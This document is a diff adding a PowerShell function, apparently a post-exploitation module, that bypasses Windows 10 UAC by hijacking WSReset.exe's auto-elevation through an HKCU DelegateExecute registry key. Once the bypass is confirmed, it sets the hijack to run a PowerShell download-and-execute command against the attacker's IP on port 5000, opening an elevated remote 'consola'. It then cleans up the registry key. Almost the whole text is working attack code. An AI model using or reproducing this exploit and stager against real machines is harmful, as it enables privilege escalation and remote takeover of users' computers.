@@ -1,0 +1,109 @@
+
+
+
+
+
+
+
+function invoke-wsreset
+    {
+    param(
+        [String] $ip
+    )
+     
+    $good = $false
+    $results = $null
+
+    $versionBuild= [System.Environment]::OSVersion.Version.Build
+    if ($versionBuild –ge 10240)   
+        {              
+        $winPath = $Env:WinDir  
+        $stringValue = cat $winPath"\System32\WSReset.exe" | Select-String 'Autoelevate'
+        if ($stringValue -match "true")
+            {
+            $path = $Env:SystemDrive+"\attpwn"
+            if (Test-Path $path) 
+                { 
+                Remove-Item -LiteralPath $path -Force -Recurse
+                }    
+            New-Item $path -ItemType Directory
+            
+            $pathfile = $Env:SystemDrive+"\attpwn\pwnd.txt"
+            $argumento = '/K' , 'attpwn > '+$pathfile 
+            $cmdpath = $winPath+"\system32\cmd.exe"
+            $instruction =  $cmdpath +" "+  $argumento
+            $path = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+            $key = "DelegateExecute" 
+            
+            
+
+            if(-not(Test-Path -Path $path))
+                {
+                New-Item $path -Force    
+                }
+        
+            
+            New-ItemProperty -Path $path -Name $key -Value "" -Force
+            Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force        
+            WSReset.exe
+            Sleep 10
+            if (Test-Path $pathfile) 
+                { 
+                $good = $True                           
+                $uri = "http://" + $ip + ":5000/consola"
+                $instruction = $winPath+"\system32\windowspowershell\v1.0\powershell.exe -W maximized -C iex(new-object net.webclient).downloadstring('"+$uri+"');consola -id $global:id"                         
+                New-ItemProperty -Path $path -Name $key -Value "" -Force
+                Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
+                WSReset.exe
+                Sleep 10
+                $result = "Bypass done! -> New 'Consola' with privilege --- Instrucción: "+ $instruction
+                $result = $result | Out-String
+                }
+                
+            }    
+        else
+            {
+            $good = $False 
+            $result = "WSReset binary does not contain autoelevate tag value True"
+            }    
+
+        rm -Force -Recurse 'hkcu:\software\classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2'    
+        if (Test-Path $path) 
+            { 
+            Remove-Item -LiteralPath $path -Force -Recurse
+            }    
+           
+     
+        }
+    else 
+        {
+        $result = "this script only works on W10"
+        }
+    return @{results=$result | Out-String ;success=$good}
+    }
+
+
+
+
+$execute = {
+  
+}
+
+
+
+
+
+
+$execute = invoke-wsreset -ip $global:remoteip
+
+
+
+  
+
+  
+
+    
+  
+
+
+return @{results=$execute.results | Out-String;success=$execute.success}
